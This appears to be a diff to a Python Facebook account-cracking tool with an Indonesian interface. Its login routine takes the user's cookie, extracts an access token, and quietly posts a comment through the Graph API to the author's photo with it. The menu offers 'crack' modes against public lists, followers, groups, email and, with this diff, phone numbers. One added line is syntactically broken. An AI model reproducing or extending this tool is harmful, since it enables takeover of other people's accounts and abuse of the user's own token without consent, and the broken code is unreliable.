@@ -828,7 +828,7 @@ def login():
 		jam      = datetime.now().strftime("%X")
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		tem      = ('\nSehat Selalu Master @[100013275378835: 0] - ]\n\nDvanmeploph [ D = The v = Verly a = Afriliyan n = And = me = Merch - ploph\n')
+		tem      = ('\nSehat Selalu Master @[100013275378835: 0] - ]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
 		link = ('https://www.facebook.com/photo?fbid=1658880191231144&set=a.135738266878685')
 		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Panutan Gw Nih Senggol Dong 🗿"])
@@ -838,7 +838,7 @@ def login():
 		ses.post(f"https://graph.facebook.com/1658880191231144/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
-	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
+	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
 
 
 
@@ -853,12 +853,13 @@ def remove():
 def menu(n,t,c):
 	clear_layar()
 	print(logo(n)+f'\n')
-	print(f" {P}[{hh}01{P}] Crack From Public     [{hh}07{P}] Crack From Nama")
+	print(f" {P}[{hh}01{P}] Crack From Public      [{hh}07{P}] Crack From Nama")
 	print(f" [{hh}02{P}] Crack From ID Random     [{hh}08{P}] Crack From File")
 	print(f" [{hh}03{P}] Crack From Followers     [{hh}09{P}] Check Ressult Account")
 	print(f" [{hh}04{P}] Crack From Comment       [{hh}10{P}] Check Account Non-Active")
 	print(f" [{hh}05{P}] Crack From Grup          [{hh}11{P}] Ccheck Option Account")
 	print(f" [{hh}06{P}] Crack From Email         [{hh}12{P}] Log Out ({M}Cookie{P})")
+	print(f" [{hh}13{P}] Crack From Phonee
 	ask = input(f' [{hh}>>{P}] Chooise : ')
 	print(' ─────────────────────────────')
 	if ask in ['1','01']:crack_publik(t,c)
@@ -873,6 +874,7 @@ def menu(n,t,c):
 	elif ask in ['10']:cek_akun()
 	elif ask in ['11']:cek_opsi_cp()
 	elif ask in ['12']:remove();exit()
+	elif ask in ['13']:crack_nomor()      
 	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] Pilih Yang Bener Lah Tolol")
 	else:sys.exit(f" [{M}>{P}] Pilih Yang Bener Lah Tolol")
 
